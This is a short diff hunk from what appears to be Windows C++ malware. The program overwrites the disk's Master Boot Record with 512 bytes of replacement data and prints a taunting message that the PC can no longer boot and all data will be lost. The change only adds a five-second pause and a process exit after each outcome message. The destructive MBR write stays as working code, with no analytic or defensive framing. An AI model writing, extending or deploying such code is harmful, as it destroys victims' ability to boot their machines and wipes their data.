@@ -18,9 +18,13 @@ int main() {
     ,NULL,OPEN_EXISTING,NULL,NULL)
     if (WriteFile(MasterBootRecord, mbrData,512,&write,NULL) ==  TRUE) {
       cout << "Your MBR (Master Boot Record) has been overwritten therefore, you can no longer boot your PC. All data will be lost, so enjoy the time on your PC while you still can." << endl;
+      Sleep(5000);
+      ExitProcess(0);
     }
     else {
       cout << "Failure to overwrite the Master Boot Record" << endl;
+      Sleep(5000);
+      ExitProcess(0);
     }
   CloseHandle(MasterBootRecord);//Closing  the handle
   return EXIT_SUCCESS;
